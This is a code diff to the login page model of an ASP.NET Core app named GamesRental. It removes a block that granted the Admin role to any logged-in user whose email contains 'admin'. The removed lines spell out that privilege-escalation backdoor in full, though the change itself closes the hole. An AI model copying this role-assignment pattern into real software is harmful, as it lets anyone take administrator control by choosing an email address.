@@ -9,17 +9,10 @@ namespace GamesRental.Areas.Identity.Pages.Account
     public class LoginModel : PageModel
     {
         private readonly SignInManager<ApplicationUser> _signInManager;
-        private readonly UserManager<ApplicationUser> _userManager;
-        private readonly RoleManager<IdentityRole> _roleManager;
-
         public LoginModel(
-            SignInManager<ApplicationUser> signInManager,
-            UserManager<ApplicationUser> userManager,
-            RoleManager<IdentityRole> roleManager)
+            SignInManager<ApplicationUser> signInManager)
         {
             _signInManager = signInManager;
-            _userManager = userManager;
-            _roleManager = roleManager;
         }
 
         [BindProperty]
@@ -63,22 +56,6 @@ namespace GamesRental.Areas.Identity.Pages.Account
 
             if (result.Succeeded)
             {
-                var user = await _userManager.FindByEmailAsync(Input.Email);
-                if (user != null && Input.Email.Contains("admin", StringComparison.OrdinalIgnoreCase))
-                {
-                    if (!await _roleManager.RoleExistsAsync("Admin"))
-                    {
-                        await _roleManager.CreateAsync(new IdentityRole("Admin"));
-                    }
-
-                    if (!await _userManager.IsInRoleAsync(user, "Admin"))
-                    {
-                        await _userManager.AddToRoleAsync(user, "Admin");
-                    }
-
-                    await _signInManager.RefreshSignInAsync(user);
-                }
-
                 return LocalRedirect(ReturnUrl);
             }
 
